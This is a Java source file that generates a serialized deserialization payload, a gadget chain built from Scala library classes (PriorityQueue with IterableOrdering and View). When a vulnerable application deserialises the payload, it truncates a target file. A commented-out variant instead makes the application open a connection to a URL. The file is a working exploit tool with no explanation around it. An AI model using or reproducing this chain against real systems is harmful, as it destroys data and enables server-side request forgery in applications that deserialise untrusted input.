import scala.Function0;
import scala.collection.IterableOnce;
import scala.math.Ordering;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Comparator;
import java.util.PriorityQueue;

public class PayloadGenerator {
    static String filePath="./target.txt";
    static String urlToConnect="http://127.0.0.1:8080";

    public static void main(String[] args) throws Exception{
        Comparator iterableOrdering =getIterableOrdering();
        IterableOnce iterableOnce1=getIterableOnce();
        IterableOnce iterableOnce2=getIterableOnce();

        PriorityQueue priorityQueue=new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(2);

        Field queueField=PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queue = (Object[]) queueField.get(priorityQueue);
        queue[0]=iterableOnce1;
        queue[1]=iterableOnce2;

        Field comparatorField= PriorityQueue.class.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue,iterableOrdering);

        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream("./payload.ser"));
        objectOutputStream.writeObject(priorityQueue);
    }


    public static Function0 getFunction0_eraseFileContents() throws Exception{
        Class clazz=Class.forName("scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3");
        Constructor constructor=clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        Function0 function0 = (Function0) constructor.newInstance(null, new File(filePath), false);
        return function0;
    }

    public static Function0 getFunction0_openConnection() throws Exception{
        Class clazz=Class.forName("scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1");
        Constructor constructor=clazz.getDeclaredConstructors()[0];
        Function0 function0= (Function0) constructor.newInstance(null,new URL(urlToConnect));
        return function0;
    }

    public static Comparator getIterableOrdering() throws Exception{
        Class clazz=Class.forName("scala.math.Ordering$IterableOrdering");
        Constructor[] constructors=clazz.getDeclaredConstructors();
        Constructor constructor=constructors[0];
        constructor.setAccessible(true);
        Ordering iterableOrdering= (Ordering) constructor.newInstance(new Object[]{null});
        return iterableOrdering;
    }

    public static IterableOnce getIterableOnce() throws Exception{
        Class clazz=Class.forName("scala.collection.View$$anon$1");
        Constructor[] constructors=clazz.getDeclaredConstructors();
        Function0 function0=getFunction0_eraseFileContents();
        //Function0 function0=getFunction0_openConnection();
        Constructor constructor=constructors[0];
        constructor.setAccessible(true);
        IterableOnce iterableOnce = (IterableOnce) constructor.newInstance(function0);
        return iterableOnce;
    }
}
